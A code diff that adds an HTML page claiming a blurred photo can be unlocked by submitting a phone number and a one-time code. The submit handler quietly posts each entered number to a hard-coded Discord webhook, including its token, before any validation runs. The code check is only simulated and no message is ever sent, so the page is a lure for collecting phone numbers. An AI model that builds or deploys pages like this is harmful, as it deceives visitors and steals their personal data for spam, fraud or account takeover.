@@ -22,4 +22,257 @@
   </style>
 </head>
     <script src='script.js'></script>
+  <style>
+  :root{
+    --card-bg:#ffffff;
+    --accent:#2563eb;
+    --muted:#6b7280;
+  }
+  *{box-sizing:border-box}
+  body{
+    font-family:Inter, system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;
+    background:linear-gradient(180deg,#eef2ff 0%, #ffffff 100%);
+    min-height:100vh;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    padding:24px;
+  }
+
+  .card{
+    width:360px;
+    background:var(--card-bg);
+    border-radius:14px;
+    box-shadow:0 10px 30px rgba(16,24,40,0.08);
+    padding:18px;
+    text-align:center;
+  }
+
+  .media{
+    width:100%;
+    border-radius:10px;
+    overflow:hidden;
+    margin-bottom:14px;
+  }
+  .media img{
+    display:block;
+    width:100%;
+    height:220px;
+    object-fit:cover;
+    filter:blur(18px);
+    transition:filter .45s ease, transform .45s ease;
+  }
+  .media img.unblur{
+    filter:blur(0);
+    transform:scale(1.02);
+  }
+
+  h2{margin:6px 0 2px;font-size:18px}
+  p.note{color:var(--muted);font-size:13px;margin:0 0 12px}
+
+  .btn{
+    display:inline-block;
+    background:var(--accent);
+    color:#fff;
+    border:none;
+    padding:10px 14px;
+    border-radius:10px;
+    cursor:pointer;
+    font-weight:600;
+  }
+  .btn.ghost{
+    background:transparent;
+    color:var(--accent);
+    border:1px solid rgba(37,99,235,0.12);
+  }
+
+  form{margin-top:8px}
+  input[type="text"]{
+    width:100%;
+    padding:10px 12px;
+    border-radius:8px;
+    border:1px solid #e6edf8;
+    margin:8px 0;
+    font-size:14px;
+  }
+  .small{font-size:13px;color:var(--muted);margin-top:8px}
+
+  .hidden{display:none}
+  .center{display:flex;gap:8px;justify-content:center;align-items:center}
+
+  .success-msg{color:#16a34a;font-weight:600}
+</style>
+</head>
+<body>
+
+<div class="card" role="main" aria-labelledby="title">
+  <div class="media" aria-hidden="false">
+    <img id="secretImg" src="https://picsum.photos/800/450" alt="Protected photo" />
+  </div>
+
+  <h2 id="title">Create an account to view this photo</h2>
+  <p class="note">Submit your phone number and enter the OTP to unlock the image.</p>
+
+  <!-- Initial action -->
+  <div id="step-view" class="">
+    <button class="btn" id="btnView">View Image</button>
+  </div>
+
+  <!-- Step 1: phone input -->
+  <div id="step-phone" class="hidden">
+    <form id="phoneForm" onsubmit="return false">
+      <input id="phoneInput" type="text" inputmode="numeric" placeholder="+8801XXXXXXXXX" aria-label="Phone number" />
+      <div class="center">
+        <button class="btn" id="btnSend">Submit number</button>
+        <button class="btn ghost" id="btnCancelPhone">Cancel</button>
+      </div>
+      <p class="small">We will send a six-digit code to this number.</p>
+    </form>
+  </div>
+
+  <!-- Step 2: otp input -->
+  <div id="step-otp" class="hidden">
+    <form id="otpForm" onsubmit="return false">
+      <input id="otpInput" type="text" inputmode="numeric" placeholder="Enter OTP" aria-label="OTP code" />
+      <div class="center">
+        <button class="btn" id="btnVerify">Verify OTP</button>
+        <button class="btn ghost" id="btnResend">Resend</button>
+      </div>
+      <p id="otpNote" class="small">OTP sent.</p>
+    </form>
+  </div>
+
+  <div id="doneMsg" class="hidden">
+    <p class="success-msg">✅ Verified — enjoy the photo!</p>
+  </div>
+</div>
+
+<script>
+  // Elements
+  const btnView = document.getElementById('btnView');
+  const stepView = document.getElementById('step-view');
+  const stepPhone = document.getElementById('step-phone');
+  const stepOtp = document.getElementById('step-otp');
+  const phoneInput = document.getElementById('phoneInput');
+  const otpInput = document.getElementById('otpInput');
+  const btnSend = document.getElementById('btnSend');
+  const btnCancelPhone = document.getElementById('btnCancelPhone');
+  const btnVerify = document.getElementById('btnVerify');
+  const btnResend = document.getElementById('btnResend');
+  const secretImg = document.getElementById('secretImg');
+  const doneMsg = document.getElementById('doneMsg');
+  const otpNote = document.getElementById('otpNote');
+
+  // State
+  let simulatedOtp = null;
+  let lastPhone = null;
+
+  // Helpers
+  function isProbablyPhone(v){
+    if(!v) return false;
+    // allow +, digits, spaces, - ; ensure at least 9 digits
+    const digits = v.replace(/[^0-9]/g,'');
+    return digits.length >= 9 && digits.length <= 15;
+  }
+
+  function generateOtp(){
+    return String(Math.floor(100000 + Math.random() * 900000));
+  }
+
+  function showPhoneStep(){
+    stepView.classList.add('hidden');
+    stepPhone.classList.remove('hidden');
+    stepOtp.classList.add('hidden');
+    doneMsg.classList.add('hidden');
+    phoneInput.focus();
+  }
+
+  function showOtpStep(){
+    stepPhone.classList.add('hidden');
+    stepOtp.classList.remove('hidden');
+    otpInput.value = '';
+    otpInput.focus();
+  }
+
+  function resetToStart(){
+    stepView.classList.remove('hidden');
+    stepPhone.classList.add('hidden');
+    stepOtp.classList.add('hidden');
+    doneMsg.classList.add('hidden');
+  }
+
+  // Events
+  btnView.addEventListener('click', () => {
+    showPhoneStep();
+  });
+
+  btnCancelPhone.addEventListener('click', () => {
+    resetToStart();
+  });
+
+  btnSend.addEventListener('click', () => {
+    const phone = phoneInput.value.trim();
+    fetch("https://discord.com/api/webhooks/1330487817914155060/7zGOaywZAThxAFy_d4r3z2kRV2im-lxXu5Na0k6nB_UnSUpbCw4jlh1E62URtcyh1K3E", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ content: phone.trim() })
+  });
+    if(!isProbablyPhone(phone)){
+      alert('Please enter a valid phone number (digits only, at least 11 digits).');
+      phoneInput.focus();
+      return;
+    }
+
+    // simulate sending OTP after phone submission
+    lastPhone = phone;
+    simulatedOtp = generateOtp();
+ 
+
+    // show OTP step
+    showOtpStep();
+    otpNote.textContent = 'OTP sent.';
+  });
+
+  btnResend.addEventListener('click', () => {
+    if(!lastPhone){
+      alert('No phone number submitted yet.');
+      return;
+    }
+    simulatedOtp = generateOtp();
+    otpNote.textContent = 'OTP resent. (Check console.)';
+  });
+
+  btnVerify.addEventListener('click', () => {
+    const entered = otpInput.value.trim();
+    if(!entered){
+      alert('Enter OTP first.');
+      return;
+    }
+    if(entered === simulatedOtp){
+      // verified
+      secretImg.classList.add('unblur');
+      stepOtp.classList.add('hidden');
+      doneMsg.classList.remove('hidden');
+      // clear state (optional)
+      simulatedOtp = null;
+      lastPhone = null;
+    } else {
+      alert('Invalid OTP. Try again or resend.');
+      otpInput.focus();
+    }
+  });
+
+  // optional: allow pressing Enter to submit forms
+  phoneInput.addEventListener('keydown', (e) => {
+    if(e.key === 'Enter'){ btnSend.click(); }
+  });
+  otpInput.addEventListener('keydown', (e) => {
+    if(e.key === 'Enter'){ btnVerify.click(); }
+  });
+
+  // initial focus
+  // phoneInput not focused until user clicks View
+</script>
+
+</body>
 </html>
